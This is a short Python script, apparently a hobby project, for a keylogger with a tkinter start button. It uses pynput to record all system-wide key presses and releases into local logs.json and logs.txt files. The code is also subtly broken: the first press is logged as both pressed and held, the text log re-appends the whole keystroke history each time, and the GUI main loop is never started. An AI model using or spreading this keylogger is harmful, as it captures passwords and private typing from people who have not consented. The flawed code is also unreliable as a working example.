import tkinter as tk
from tkinter import Label, Button
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("150x200")
root.title("Keylogger project")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'a') as key_strokes:
        key_strokes.write(key)

def update_json_file(key_list):
    with open("logs.json", 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list, key_strokes
    if x == False:
        key_list.append({"pressed": f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes += str(key)
    update_txt_file(key_strokes)

def button_action():
    print("[+] Running Keylogger Successfully! Saving the keystrokes in 'logs.json'")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

empty = Label(root, text="Keylogger Project", font=("Verdana", 10, "bold"))
empty.grid(row=2, column=2)

start_button = Button(root, text="Start Keylogger", command=button_action)
start_button.grid(row=5, column=2)

